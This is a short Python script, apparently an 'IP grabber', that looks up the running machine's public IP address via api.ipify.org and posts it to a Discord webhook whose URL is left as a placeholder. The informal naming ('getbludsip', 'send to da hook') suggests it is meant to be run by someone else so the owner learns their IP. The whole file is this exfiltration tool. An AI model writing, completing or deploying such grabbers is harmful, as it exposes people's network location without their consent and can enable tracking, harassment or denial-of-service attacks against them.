from dhooks import Webhook
from requests import get

hooky = Webhook('webhook here')

# gets ip 
def getbludsip():
    ip = get('https://api.ipify.org').content.decode('utf8')
    print('{}' .format(ip))
    return ip


# send to da hook
ip = getbludsip()
hooky.send('ip: ```{}``` '  .format(ip))


getbludsip()
